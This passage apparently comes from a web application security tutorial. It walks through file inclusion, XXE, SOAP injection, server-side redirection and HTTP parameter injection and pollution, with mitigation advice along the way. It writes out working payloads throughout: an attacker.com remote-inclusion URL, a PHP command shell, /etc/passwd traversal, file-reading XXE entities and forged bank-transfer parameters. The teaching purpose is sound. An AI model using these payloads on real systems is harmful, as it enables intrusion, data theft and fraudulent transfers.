- Submit a URL pointing to a resource on a web server you control. For example:

```
https://target-app.com/main.php?Country=http://attacker.com/malicious.php
```

- If the server requests your file, it indicates that remote file inclusion is possible.

2. Check for Connection Attempts to Invalid Hosts:

- If the first test fails, try submitting a URL with a non-existent or unreachable IP address. Example:

```
https://target-app.com/main.php?Country=http://192.0.2.999/malicious.php
```

- If the application hangs or times out, it suggests that the server is attempting to fetch the resource, but external connections may be restricted.

3. Exploit the Vulnerability:

- If the application is vulnerable, craft a malicious script using the appropriate server-side language (e.g., PHP) to gain unauthorized execution capabilities. Example:

```
<?php
system($_GET['cmd']);
?>
```

- Hosting this script on your server and calling it via the vulnerable parameter can allow remote command execution.

#### Testing for Local File Inclusion (LFI):

Local file inclusion vulnerabilities can exist in a wider range of applications and scripting environments, including those that do not support remote file inclusion. To test for LFI, follow these steps:

1. Submit the Name of a Known Executable Resource:

- Try including a known executable file on the server, such as a script or configuration file. Example:

```
https://target-app.com/main.php?Country=config.php
```

- If the server loads or executes the file, it confirms an LFI vulnerability.

2. Submit the Name of a Known Static Resource:

- Test whether the application loads non-executable files, such as images or text files. Example:

```
https://target-app.com/main.php?Country=logo.png
```

- If the raw contents of the file are returned, it suggests that the inclusion mechanism is functioning but may not be executable.

**Distinction Between Executable and Static Resources:**

- Executable resources: PHP, ASP, JSP files that can be executed by the server.

- Static resources: Images, text files, configuration files, and logs that may be read but not executed.

3. Attempt to Access Sensitive Functionality:

- If LFI is possible, try including restricted admin pages or configuration files. Example:

```
https://target-app.com/main.php?Country=../../admin/config.php
```

- This might expose sensitive data or allow privilege escalation.

4. Test Directory Traversal Techniques:

- Use path traversal sequences (```../```) to escape the expected directory and access system files. Example:

```
https://target-app.com/main.php?Country=../../../../etc/passwd
```

- If successful, this confirms that the application is vulnerable to arbitrary file retrieval.

#### Injecting into XML Interpreters:

XML is still used in many web applications, especially in systems that haven’t fully migrated to modern RESTful or JSON-based APIs. While REST APIs are now the standard, XML persists in backend components, enterprise tools, and old-school technologies like SOAP. Anywhere XML is parsed—whether in user-submitted requests or server-to-server messages—there's a risk of XML injection or XXE (XML External Entity) attacks.

These attacks can be devastating. By crafting malicious XML payloads, attackers can interfere with application logic, access sensitive files, interact with internal services, or even crash the server.

**Note:** SOAP is fading, but XML vulnerabilities are not. Attackers still target XML parsers embedded in modern applications, CI/CD systems, cloud-based tools, and document-processing engines. If your application parses XML, assume it’s a target.

##### XML External Entity Injection (XXE):

When an application parses XML input without disabling certain features, attackers can smuggle in "entities"—special variables that resolve into data. These can reference internal files, remote URLs, or even stream data infinitely. Here’s a common scenario using XML for a background Ajax search:

```
POST /search/128/AjaxSearch.ashx HTTP/1.1
Host: mdsec.net
Content-Type: text/xml; charset=UTF-8
Content-Length: 44

<Search><SearchTerm>nothing will change</SearchTerm></Search>
```

The server replies with:

```
HTTP/1.1 200 OK
Content-Type: text/xml; charset=utf-8
Content-Length: 81

<Search><SearchResult>No results found for expression: nothing will change</SearchResult></Search>
```

If this server uses a vulnerable XML parser, you can define a custom entity like so:

```
<!DOCTYPE foo [ <!ENTITY testref "testrefvalue" > ]>
```

- ```<!DOCTYPE foo [...]>``` — Defines a custom document type (usually optional).

- ```<!ENTITY testref "testrefvalue">``` — Creates an entity named ```testref``` whose value is ```"testrefvalue"```.

In the XML body, writing ```&testref;``` will be replaced with the value ```"testrefvalue"``` during parsing.

##### XXE to Read Local Files:

Here’s a malicious request to read ```C:\Windows\win.ini``` on a Windows server:

```
POST /search/128/AjaxSearch.ashx HTTP/1.1
Host: mdsec.net
Content-Type: text/xml; charset=UTF-8
Content-Length: 115

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" > ]>
<Search><SearchTerm>&xxe;</SearchTerm></Search>
```

If successful, the server's response might leak file content like this:

```
<Search><SearchResult>No results found for expression: ; for 16-bit app support
[fonts]
[extensions]
[files]</SearchResult></Search>
```

##### XXE to Hit Internal Services:

Instead of referencing a local file, attackers can point to internal services:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.1.1:25" > ]>
<Search><SearchTerm>&xxe;</SearchTerm></Search>
```

This can be used to:

- Probe internal services (port scanning)

- Steal internal web content (SSRF)

- Exploit hidden vulnerabilities in internal apps

##### XXE as a Denial-of-Service (DoS) Weapon:

And here’s the fun DoS trick:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///dev/random" > ]>
<Search><SearchTerm>&xxe;</SearchTerm></Search>
```

```/dev/random``` is a special file on Unix systems that produces an endless stream of random bytes. When the parser tries to read this "file," it never stops, potentially locking up resources and causing the app to hang or crash. This isn’t recursion—it’s infinite I/O chaos.

**Defensive TL;DR**

- Disable DTD and external entity parsing in your XML parser.

- Use less dangerous formats like JSON unless absolutely necessary.

- Always validate and sanitize user input—especially anything passed to a parser.

#### Injecting into SOAP Services:

*Simple Object Access Protocol (SOAP)* is a message-based communication protocol that uses XML to format and transmit data. It's primarily used for web services, especially in large-scale enterprise environments where systems running on different platforms need to interact. Even though it’s not as trendy as REST today, SOAP is still lurking beneath the surface in many corporate back-end systems.

In web applications, you may not see SOAP directly in browser interactions. However, it often appears in communications between **back-end** components—especially when a web app serves as a frontend wrapper for legacy or modular systems. These SOAP messages are formatted in XML, and like any interpreted language, XML opens the door to potential injection vulnerabilities if user input isn’t properly sanitized. Let’s walk through a practical example.

Imagine a banking application where a user initiates a funds transfer through a standard HTTP POST request like this:

```
POST /bank/27/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 65

FromAccount=18281008&Amount=1430&ToAccount=08447656&Submit=Submit
```

On the back end, the app constructs a SOAP message to relay this request between internal systems:

```
<soap:Envelope xmlns:soap="http://www.w3.org/2001/12/soap-envelope">
  <soap:Body>
    <pre:Add xmlns:pre="http://target/lists" soap:encodingStyle="http://www.w3.org/2001/12/soap-encoding">
      <Account>
        <FromAccount>18281008</FromAccount>
        <Amount>1430</Amount>
        <ClearedFunds>False</ClearedFunds>
        <ToAccount>08447656</ToAccount>
      </Account>
    </pre:Add>
  </soap:Body>
</soap:Envelope>
```

The back-end logic has added a ```<ClearedFunds>``` field and set it to ```False```, meaning the account lacks sufficient funds to complete the transfer. As a result, the transaction is blocked.

Because XML uses special characters (```<```, ```>```, ```/```) to define structure, injecting those characters into user-controllable fields can allow you to break out of existing tags or insert new ones—just like with HTML or SQL injection. This can let you tamper with the SOAP structure, override logic, or trick the receiving component. Let’s look at a few ways to do it:

1. Inserting a Forged XML Element Early in the Structure:

If the application blindly embeds the ```Amount``` parameter into the XML, we can inject an extra ```<ClearedFunds>``` element that appears before the legitimate one:

```
POST /bank/27/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 119

FromAccount=18281008&Amount=1430</Amount><ClearedFunds>True</ClearedFunds><Amount>1430&ToAccount=08447656&Submit=Submit
```

This will result in a SOAP message that looks like:

```
<Amount>1430</Amount>
<ClearedFunds>True</ClearedFunds>
<Amount>1430</Amount> <!-- duplicated to maintain structure -->
```

If the receiving component processes the first ```<ClearedFunds>``` tag it finds, your forged value ```True``` may take precedence—even if the account really doesn’t have funds.

Alternatively, if the system processes the last tag instead, you could inject via ```ToAccount```:

```
ToAccount=08447656</ToAccount><ClearedFunds>True</ClearedFunds><ToAccount>08447656
```

2. Using XML Comments to Mask Legitimate Data:

Another technique is to inject XML **comments** that neutralize parts of the legitimate SOAP message. This allows you to inject your own elements while preventing conflicts with existing ones:

```
POST /bank/27/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 125

FromAccount=18281008&Amount=1430</Amount><ClearedFunds>True</ClearedFunds><ToAccount><!--&ToAccount=-->08447656&Submit=Submit
```

Here’s what happens:

- You close the ```<Amount>``` tag.

- Insert your fake ```<ClearedFunds>``` element.

- Begin the legitimate ```<ToAccount>``` element but inject an XML comment that hides the application's original value.

- Then re-inject your own ```<ToAccount>``` value.

The parser ignores the commented-out section, allowing your spoofed values to take effect.

**Additional Notes:**

In both examples, we’re tampering with the structure of the XML, but the intent and behavior differ subtly, and here's why:

*Example 1 – Double Element Insertion (No Commenting):*

```
Amount=1430</Amount><ClearedFunds>True</ClearedFunds><Amount>1430&ToAccount=08447656
```

- You're inserting another ```<ClearedFunds>``` element **before** the legitimate one.

- If the backend logic uses the first occurrence of a field (like many naive XML parsers do), your injected value (```True```) is taken as gospel, even if the actual logic said ```False```.

- You're not breaking the structure completely—just messing with **element order**.

*Example 2 – XML Comment Obfuscation:*

```
Amount=1430</Amount><ClearedFunds>True</ClearedFunds><ToAccount><!--&ToAccount=-->08447656
```

- Here, you're commenting out the original ```ToAccount``` parameter **entirely**, meaning it won't be parsed at all. Then you provide your own ```ToAccount``` field (after the comment), which may be parsed as the only valid one.

- This trick is especially useful when you can’t remove parameters directly (say they’re hardcoded or appended automatically), but you still want to neutralize them and inject your own.

*So why bother with the comment approach?*

Because sometimes, the app might:

- Auto-append ```<ToAccount>``` based on hidden fields or server-side code.

- Not let you **omit** a parameter cleanly (e.g., default value is always included).

- Require you to preserve the correct XML syntax, which would break if you just leave two ```<ToAccount>``` elements.

Commenting out is like a surgical strike: it disables what you can’t delete and inserts what you want instead. In practice, the one that works depends on **how the backend parses the XML**, and whether it prioritizes *first seen*, *last seen*, or *fails on duplicates*.

3. Full SOAP Injection and Comment-Out:

You can attempt to **complete the entire SOAP message yourself** inside one of the parameters and comment out the remainder to prevent it from conflicting. This is risky and likely to fail if the XML parser is strict, but might work against homemade or poorly implemented parsers.

```
POST /bank/27/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 176

FromAccount=18281008&Amount=1430</Amount><ClearedFunds>True</ClearedFunds><ToAccount>08447656</ToAccount></Account></pre:Add></soap:Body></soap:Envelope><!--&Submit=Submit
```

Here, you:

- Close all open tags manually.

- Terminate the full SOAP structure.

- Use ```<!--``` to comment out any remaining parts the app may try to append.

This trick results in invalid XML, unless the parser is lenient or custom-built. XML comment tags (```<!-- ... -->```) are powerful tools to bypass or suppress parts of the original message. This type of injection is most dangerous in loosely validated or legacy systems still relying on SOAP for internal communication.

#### Finding and Exploiting SOAP Injection:

SOAP injection can be tricky to detect because submitting malformed XML often just causes a generic error—or worse, no response at all. That doesn’t mean there’s no vulnerability, just that we have to be more careful and creative in how we probe it. Below is a structured approach to detecting and potentially exploiting SOAP injection vulnerabilities:

**Step 1: Insert a Rogue Closing Tag**

Goal: Check if your input is being placed inside an XML context.

- Test payload: ```</foo>```

- Submit it in each parameter, one at a time.

What to look for:

- If the application returns a parsing error or crashes, your input is likely being injected into a SOAP (or other XML) structure.

- If nothing happens or you get a "normal" response, the input is likely not used in an XML context, or it’s being sanitized.

**Step 2: Try a Well-Formed Element**

Goal: See if you can inject *valid* XML that’s accepted.

- Test payload: ```<foo>bar</foo>```

- What this does: Sends valid XML to see if the parser tolerates custom content.

Interpretation:

- If this input makes the error disappear or alters behavior, it confirms the parser is processing your XML tags—meaning injection is possible.

**Step 3: Detect XML Normalization**

Sometimes, the app stores your input and later returns it as part of a SOAP message. In these cases, you can test how it handles formatting and normalization.

- Test input #1: ```test<foo/>```

- Test input #2: ```test<foo></foo>```

What to look for:

- If input #1 gets returned as input #2, or both are returned as just ```test```, you’re seeing normalization—proof that your input was interpreted as XML.

This can be useful for:

- Mapping out how the app processes XML

- Confirming that your input is *within* a structured SOAP envelope

**Step 4: Using XML Comments to Break Logic**

Goal: Disrupt the XML structure across multiple parameters to change logic or disable fields.

This is a *tricky but powerful* move when the application builds the SOAP body dynamically from multiple request parameters.

Here’s how it works:

1. Submit the opening comment in one parameter:

- ```ParamA=<!--```

2. Submit the closing comment in another:

- ```ParamB=-->```

Then reverse the order in another test:

- ```ParamA=-->```

- ```ParamB=<!--```

Why this works:

- If the application just naively inserts these parameters into an XML message like this:

```
<Body>
  <FromAccount>18281008</FromAccount>
  <ToAccount><!--</ToAccount>
  <Amount>1000</Amount>
  <Currency>USD--></Currency>
</Body>
```

- The entire chunk between ```<!--``` and ```-->``` becomes commented out, and the XML parser skips it.

What that gives you:

- Ability to *disable specific fields*, like ```ToAccount```, ```Amount```, or anything else.

- In edge cases, you can comment out *closing tags* to create malformed structures that alter execution.

Realistic payload example:

```
POST /transfer HTTP/1.1
Host: vulnerable-bank.local
Content-Type: application/x-www-form-urlencoded

FromAccount=18281008&ToAccount=<!--&Amount=1000&Currency=USD-->&Submit=Submit
```

**Exploitation Tips:**

Once you confirm SOAP injection, actual exploitation is often more difficult. The key is *knowing the exact XML structure* that surrounds your input so you can carefully inject closing tags, new elements, or other manipulations *without breaking the whole document*.

If you're lucky:

- Error messages may disclose full SOAP content.

- You might see stack traces, or even exact lines of the malformed XML.

If you're unlucky:

- You'll be flying blind—just throwing malformed XML and hoping something breaks differently.

Overall, SOAP injection is all about finesse. You’re trying to *sculpt the backend XML with nothing but your input*, like carving a statue using someone else's chisel. Start small—detect the injection point, confirm XML processing, then escalate to logic tampering or field replacement. And never forget—when comments become your payloads, you’re hacking *between the lines*.

##### Preventing SOAP Injection:

To defend against SOAP injection, you need to validate and sanitize any data that's inserted into a SOAP message—regardless of where it came from. That includes:

- User input from the current request

- Data stored from previous requests

- Anything derived from user-controllable sources

**Core Rule: Encode Metacharacters**

The key prevention technique is *HTML encoding* of special XML characters. This converts characters that have structural meaning in XML into harmless entity codes, so they’re treated as data rather than markup. Here are the most critical ones:

```
| Character | HTML Entity |
| --------- | ----------- |
| `<`       | `&lt;`      |
| `>`       | `&gt;`      |
| `/`       | `&#47;`     |
| `&`       | `&amp;`     |
| `"`       | `&quot;`    |
| `'`       | `&#39;`     |
```

By escaping these, you make sure the parser doesn't accidentally treat your data like part of the XML structure.

**Best Practices:**

- Sanitize *before inserting into the SOAP message*—not after.

- Apply encoding on both *client-side and server-side*, but trust only the server.

- Don’t rely on blacklists—filtering out ```<script>``` is useless if someone injects malformed but valid XML.

- Use XML libraries that automatically escape data where possible (e.g., ```.createElement()``` vs string concat).

#### Injecting into Back-end HTTP Requests:

Sometimes, web applications act like middlemen—receiving user input and embedding it into *back-end* HTTP requests to other internal services. This is especially common with SOAP, REST APIs, or any internal service communication where the client isn't meant to see what's under the hood.

But if that input isn't properly sanitized, it becomes an open invitation for attackers to tamper with how those internal requests behave. The app essentially becomes a proxy, blindly inserting user-controlled data into outgoing requests—perfect for mischief.

These injection scenarios usually fall into a few powerful categories:

- **Server-Side HTTP Redirection:** The attacker controls the destination URL of an internal request, forcing the server to fetch arbitrary content—possibly even internal-only services.

- **HTTP Parameter Injection (HPI):**  Malicious users inject additional name/value pairs into internal requests, potentially modifying behavior or accessing unintended functionality.

- **HTTP Parameter Pollution (HPP):** If a parameter already exists in the request, attackers might override it or confuse the backend by supplying the same parameter multiple times.

#### Server-Side HTTP Redirection (SSRD):

Server-side HTTP redirection vulnerabilities arise when an application embeds user-supplied input into a URL that it later uses to make an HTTP request from the server side. This could involve retrieving a resource like a CSS file, interacting with an external service (e.g., payment gateway), or even accessing internal services that aren't directly exposed to users. The user-controlled input might be the full URL, or just a part of it—such as the hostname or a file path.

The danger lies in the application's trust in this user-supplied input. If it doesn’t validate or restrict what URLs are allowed, an attacker can manipulate the destination of these server-side requests. This turns the app into an *unwitting HTTP proxy*, and that’s where the real fun (and risk) begins.

Imagine a web application that allows users to select a CSS theme via a ```loc``` parameter:

```
POST /account/home HTTP/1.1  
Host: wahh-blogs.net  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 65  

view=default&loc=online.wahh-blogs.net/css/wahh.css
```

In a normal case, the backend server fetches the CSS from ```online.wahh-blogs.net```. But if the application doesn't properly validate the ```loc``` parameter, an attacker can simply swap out the hostname:

```
POST /account/home HTTP/1.1  
Host: wahh-blogs.net  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 65  

view=default&loc=192.168.0.1:22
```

The application now attempts to connect to ```192.168.0.1``` on port ```22```—which is usually an SSH service. If this works, the response might include the service banner:

```
HTTP/1.1 200 OK  
Connection: close  
SSH-2.0-OpenSSH_4.2  
Protocol mismatch.
```

That single line proves the server connected to the SSH service, showing the application is vulnerable to server-side redirection.

This isn’t just about being able to request arbitrary URLs. A successful server-side HTTP redirection (SSRD) bug can be weaponized in the following ways:

1. Internet-Based Attacks:

The app can be abused as an *open proxy*. Malicious requests sent through the vulnerable app appear to come from the server’s IP. Attackers can use this to:

- Obfuscate their origin

- Evade IP-based blocking or rate limiting

- Bypass geo restrictions

2. Internal Network Attacks:

The application may have access to internal IP ranges (e.g., ```10.0.0.0/8```, ```192.168.x.x```). Attackers can now scan internal services, grab banners, and potentially exploit services not otherwise exposed to the internet.

3. Loopback Abuse:

By targeting ```127.0.0.1```, attackers might probe services running locally on the application server itself—like admin panels, internal APIs, or even cloud metadata endpoints (like AWS’s ```http://169.254.169.254/latest/meta-data/```).

4. SSRF-Like Payload Injection:

While SSRF usually targets internal services through crafted requests (often inside JSON or XML payloads), SSRD rides on URL-based mechanisms, but the end goal is the same: force the server to connect somewhere it shouldn’t.

5. Cross-Site Scripting (XSS) via Proxying:

In some cases, the attacker can force the server to fetch attacker-controlled content and reflect it in the response. If this content contains JavaScript, it may result in XSS or content injection, depending on how the response is rendered.

**Mitigation Strategies:**

- Whitelist URLs or hostnames that the app is allowed to fetch from.

- Disallow IP address usage in URL parameters unless explicitly needed.

- Block access to internal IP ranges like ```127.0.0.1```, ```10.x.x.x```, ```192.168.x.x```, etc.

- Sanitize and validate all URL input, ensuring it doesn’t redirect or proxy to unapproved resources.

- Monitor for usage patterns that resemble proxy abuse or internal recon.

#### Exploitation Tips for Server-Side HTTP Redirection Vulnerabilities:

1. Identify Parameters with URL-like Values:

Begin by inspecting all request parameters for values that resemble hostnames, IP addresses, or full URLs. These are the prime candidates for testing redirection behavior or back-end fetching. Parameters named ```url```, ```target```, ```dest```, ```redirect```, ```uri```, ```loc```, or similar often hint at such functionality.

2. Test with Similar Alternative Resources:

Modify the parameter's value to request a different but syntactically similar resource. For instance, if it's originally fetching ```http://cdn.site.com/style.css```, try replacing the domain or path with another valid location you control. Observe whether the server reflects, redirects, or fetches this new resource.

3. Trigger an External Callback:

Supply a URL pointing to a server you control, and monitor for incoming HTTP requests. This confirms that the application makes server-side requests based on user input. Spinning up a simple HTTP server (e.g., with Python’s ```python3 -m http.server 80```) on your attack box is a perfect way to observe callbacks, even without owning a public domain.

4. Detect Silent Failures via Timing:

If your server doesn't receive an incoming request, the app might be blocking outbound connections. To test this, note the response time. A long delay could suggest that the app is attempting to connect and timing out. As for a tool to monitor timing differences easily—Burp Suite itself logs response times, and you can use CLI tools like ```curl```, ```time```, or ```ffuf``` to automate and track response durations across multiple URLs.
 
5. Abuse the Functionality for Further Attacks:

If the app accepts arbitrary URLs, the fun begins:

**a. Port Specification:** Try to supply a full URL with a custom port, like ```http://targethost:22/```. If the app attempts to fetch this, you've just unlocked the ability to scan internal services like SSH, RDP, or database ports.

**b. Internal Port Scanning:** Use Burp Intruder or a custom script to iterate through internal IPs and ports (```http://10.0.0.X:PORT/```) and look for differences in timing or error responses.

**Note:** Burp Intruder in the free version throttles requests heavily. Alternatives include:

- Python with ```requests``` or ```httpx```

- ```ffuf``` (Fast web fuzzer)

- Custom Bash loops with ```curl``` and ```time```

- ```GoBuster``` can sometimes be repurposed too, though it’s more directory-focused.

**c. Loopback Access:**  Try URLs like ```http://127.0.0.1:8000/``` or ```http://localhost/admin/```. This may let you interact with internal dashboards or admin panels not intended for public access.

**d. Cross-Site Scripting (XSS) Injection:** If you can load a page you control and its content ends up in the application's response, you've got yourself a stored or reflected XSS. Deliver a harmless payload (e.g., ```<script>alert(1)</script>```) and observe how it's handled.

**Note on Framework Behavior:** Some server-side methods—like ```Server.Transfer()``` and ```Server.Execute()``` in ASP.NET—only support relative paths, not full URLs. However, if user input is fed into them without validation, you may still gain access to protected local resources by exploiting trust boundaries. Think of paths like ```/admin/hidden.aspx```—these might be off-limits in normal routing but vulnerable through internal rerouting logic.

#### HTTP Parameter Injection (HPI):

HTTP Parameter Injection arises when user-supplied parameters are inserted directly into a back-end HTTP request. This commonly happens when a front-end web application communicates with other internal systems—like payment processors, APIs, or microservices—by forwarding or relaying request data. Let’s look at a simplified bank transfer example to understand this better.

A user initiates a transfer through the banking website:

```
POST /bank/48/Default.aspx HTTP/1.1
Host: mdsec.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

FromAccount=18281008&Amount=1430&ToAccount=08447656&Submit=Submit
```

This front-end request is handled by the application server, which then forwards part of the data to a back-end system responsible for validating and performing the transfer. The application crafts and sends this internal request:

```
POST /doTransfer.asp HTTP/1.1
Host: mdsec-mgr.int.mdsec.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

fromacc=18281008&amount=1430&toacc=08447656
```

This is a typical server-to-server interaction within the bank's infrastructure. Here, the back-end system checks if there are sufficient cleared funds before approving the transfer. However, it turns out the front-end server *can optionally* include an extra parameter, ```clearedfunds=true```, which tells the back-end to skip the check and proceed with the transfer. If an attacker knows about this hidden functionality, they can attempt to inject the clearedfunds parameter into the back-end request.

Since the front-end doesn't expect a ```clearedfunds``` parameter directly, the attacker uses URL encoding to smuggle it into an existing parameter—commonly referred to as parameter smuggling.

Malicious Front-End Request:

```
POST /bank/48/Default.aspx HTTP/1.1
Host: mdsec.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 96

FromAccount=18281008&Amount=1430&ToAccount=08447656%26clearedfunds%3Dtrue&Submit=Submit
```

Here’s what’s going on:

- ```%26``` is a URL-encoded ```&```, used to fake an additional parameter inside another.

- ```%3D``` is a URL-encoded ```=```, used to assign a value to it.

- The application server URL-decodes the values and processes the ```ToAccount``` parameter as:

```
ToAccount = 08447656&clearedfunds=true
```

So, when this is passed into the back-end request unsanitized, it becomes:

```
POST /doTransfer.asp HTTP/1.1
Host: mdsec-mgr.int.mdsec.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

fromacc=18281008&amount=1430&toacc=08447656&clearedfunds=true
```

This successfully bypasses the funds check, resulting in unauthorized transfers.

**Notes:**

- This attack relies on input injection into back-end requests, often through parameters not visible or expected in the front-end.

- The front-end URL-decodes parameters, and if it doesn’t *sanitize or re-encode* them properly before building the back-end request, it can lead to injection.

- Unlike SOAP or XML injection, *errors are rare*—so guessing parameter names often requires source code, internal documentation, or knowledge of third-party libraries used in the app.

- Detection in *black-box testing* is difficult unless you know what parameters the back-end expects. But if you're lucky and the app uses public libraries or third-party APIs, reading their docs or source code can reveal hints.

- When fuzzing, try appending ```&knownparam=value``` into other param values and watch for behavior changes or unexpected success messages.

#### HTTP Parameter Pollution (HPP):

HTTP Parameter Pollution (HPP) is a technique that exploits inconsistent handling of duplicate HTTP parameters by web servers and applications. It's especially powerful when combined with *HTTP Parameter Injection (HPI)*, allowing attackers to manipulate backend logic in subtle, hard-to-detect ways.

The HTTP specification doesn’t mandate a consistent behavior when a request includes *multiple parameters with the same name*. This ambiguity leads to various real-world behaviors depending on the platform or framework being used. Common strategies include:

- Using the first instance of the parameter.

- Using the last instance of the parameter.

- Concatenating all values, sometimes with a delimiter.

- Constructing an array of all values.

Let’s revisit our earlier HPI scenario involving a backend bank transfer operation. The normal backend request looks like this:

```
POST /doTransfer.asp HTTP/1.0
Host: mdsec-mgr.int.mdsec.net
Content-Length: 62

fromacc=18281008&amount=1430&clearedfunds=false&toacc=08447656
```

Now suppose the attacker wants to override the value of the ```clearedfunds``` parameter to ```true```. If the attacker can inject parameters via the front-end request, and *if parameter pollution is possible*, then this can be done without needing to inject a brand-new parameter—instead, a *duplicate key* is added with a different value.

If the backend system uses *the first occurrence* of each parameter, then the attacker should insert their malicious parameter *before* the original one. For example, the attacker might tamper with the ```FromAccount``` parameter in the frontend request like this:

```
POST /bank/52/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 96

FromAccount=18281008%26clearedfunds%3dtrue&Amount=1430&ToAccount=08447656&Submit=Submit
```

After decoding, this injects ```clearedfunds=true``` into the backend request:

```
fromacc=18281008&clearedfunds=true&amount=1430&clearedfunds=false&toacc=08447656
```

If the server picks the first occurrence (```clearedfunds=true```), the attacker successfully bypasses the funds check.

On the flip side, if the backend uses *the last occurrence* of any parameter, the attacker would need to inject their polluted parameter at the end, such as into ```ToAccount```:

```
ToAccount=08447656%26clearedfunds%3dtrue
```

Resulting in:

```
...&clearedfunds=false&toacc=08447656&clearedfunds=true
```

Now, the last ```clearedfunds=true``` is used—again, bypassing the check.

The effects of HPP depend on *how duplicated parameters* are resolved, and which *middleware or backend components* are involved. If a Web Application Firewall (WAF) or reverse proxy preprocesses the request differently than the web application itself, you end up with a dangerous inconsistency. For example:

- The WAF might discard the duplicate and only process the first one.

- Meanwhile, the backend application might build a string using all values or prefer the last one.

This mismatch can lead to *security policy bypasses, logic flaws*, or even *authorization escalation*. HPP is particularly devious because it often doesn't break anything visibly—it just silently alters behavior.

#### Attacks Against URL Translation:

Modern web servers often rewrite incoming URLs to internally route requests to the correct back-end resources. This process is common in applications that implement REST-style routing, vanity URLs, or use custom navigation wrappers. While this improves user-friendliness, it also introduces new surfaces for attacks—particularly *HTTP Parameter Injection (HPI)* and *HTTP Parameter Pollution (HPP)*—when parameters are passed or embedded within the URL path itself.

To keep URLs clean and readable, some applications encode parameter values directly into the file path, rather than using traditional query strings. These “pretty URLs” are then internally translated to back-end script calls via rules—most commonly using Apache’s ```mod_rewrite``` module.

Consider the following rewrite configuration in Apache:

```
RewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\ /pub/user/[\w\.\%]+(\?.*)?\ HTTP/
RewriteRule ^pub/user/([\w\.\%]+)$ /inc/user_mgr.php?mode=view&name=$1 [L,QSA]
```

This rule performs the following:

- It matches requests like ```/pub/user/marcus```

- Then rewrites them into ```/inc/user_mgr.php?mode=view&name=marcus```

- It appends the user identifier (```marcus```) to the query string as the ```name``` parameter and adds ```mode=view``` by default.

Now, suppose an attacker wants to override the default ```mode=view``` parameter and instead switch the functionality to edit. They could attempt a payload like this:

```
/pub/user/marcus%26mode=edit
```

Let’s break down what happens:

1. The ```%26``` is URL-decoded into ```&```, so the URL becomes:

```
/pub/user/marcus&mode=edit
```

2. This gets passed through the rewrite rule and ends up as:

```
/inc/user_mgr.php?mode=view&name=marcus&mode=edit
```

Now the back-end receives two ```mode``` parameters. How it handles them depends on the server-side platform:

- In PHP, when a parameter is duplicated, the last one wins—so ```mode=edit``` is what takes effect.

- The attacker has successfully overridden the intended behavior, switching from "view" mode to "edit" mode.

This type of attack combines *URL path manipulation* with *query parameter injection*, exploiting the trust developers place in rewrite logic. It becomes especially dangerous when:

- The rewritten URLs grant access to sensitive features (e.g., ```edit```, ```admin```, ```delete```).

- There’s no proper input sanitization before rewriting.

- Multiple technologies handle the request differently (e.g., a reverse proxy passes one value while the app uses another).

**Additional Notes (RewriteCond Explanation):**

```
RewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\ /pub/user/[\w\.\%]+(\?.*)?\ HTTP/
```

This line checks the original HTTP request line (e.g., ```"GET /pub/user/marcus HTTP/1.1"```) before any rewriting.

- ```^``` → Start of the line.

- ```[A-Z]{3,9}``` → Matches the HTTP method (like ```GET```, ```POST```, ```DELETE```). Between 3 to 9 uppercase letters.

- ```\``` → Literal space (escaped).

- ```/pub/user/``` → A hard-coded path that must be in the URL.

- ```[\w\.\%]+``` → Matches one or more characters that are:

1. ```\w``` → Alphanumeric or underscore (```[a-zA-Z0-9_]```)

2. ```\.``` → A literal dot

3. ```\%``` → A literal percent sign (to catch URL-encoded characters like ```%26```)

- ```(\?.*)?``` → An optional query string:

1. ```\?``` → The literal ```?``` that starts a query string

2. ```.*``` → Anything after it (could be parameters like ```?debug=true```)

- ```\ HTTP/``` → Literal space and ```HTTP/``` (to match ```HTTP/1.1```, ```HTTP/2.0```, etc.)

This makes sure it only applies to clean URLs like ```/pub/user/marcus``` (possibly with query strings), using valid HTTP methods.

```
RewriteRule ^pub/user/([\w\.\%]+)$ /inc/user_mgr.php?mode=view&name=$1 [L,QSA]
```

- ```^pub/user/``` → Start of the path must begin with ```/pub/user/```

- ```([\w\.\%]+)``` → Capture group #1: the username (same character set as above)

- ```$``` → End of the path (no more after the username)

This captures the username-like segment in the URL and rewrites it to:

```
/inc/user_mgr.php?mode=view&name=<captured_value>
```

- ```$1``` refers to the first captured group (e.g., ```marcus```)

- ```[L]``` means "Last rule" — stop processing more rules if this one matches.

- ```[QSA]``` (Query String Append) keeps any query string from the original URL and appends it to the new one (important for not discarding things like ```?foo=bar```).

**Example in Action:**

```
GET /pub/user/marcus%26mode=edit HTTP/1.1
```

After decoding:

```
GET /pub/user/marcus&mode=edit HTTP/1.1
```

Rewrite becomes:

```
/inc/user_mgr.php?mode=view&name=marcus&mode=edit
```

And we're in edit mode like a sneaky little phantom in the machine.

#### Exploiting URL Parameter Injection (HPI/HPP Tips & Tricks):

When facing applications that perform *URL rewriting* or *parameter translation*, it's possible to manipulate how parameters are parsed and interpreted by appending new ones midstream. Here's a structured exploitation flow to uncover and weaponize such vulnerabilities:

**Step 1: Inject New Parameters via Encoding Tricks**

Target *each individual parameter* in the URL, especially those passed in the path or query string, and try injecting an extra parameter using different encoding formats. Examples:

- ```param=value%26foo%3dbar``` → URL-encoded version of ```&foo=bar```: Injects ```foo=bar``` into the same parameter by sneaking in an ampersand as ```%26```.

- ```param=value%3bfoo%3dbar``` → Encoded ```;foo=bar``` (semicolon sometimes treated as a param separator in legacy systems or permissive parsers).

- ```param=value%2526foo%253dbar``` → Double URL-encoded version of ```&foo=bar```: Might bypass filters or WAFs that decode input once but forget to validate the second decoding step.

These techniques aim to *smuggle in a second parameter* within the value of another, which may break free during URL decoding.

**Step 2: Detect Parameters Ignoring the Injection**

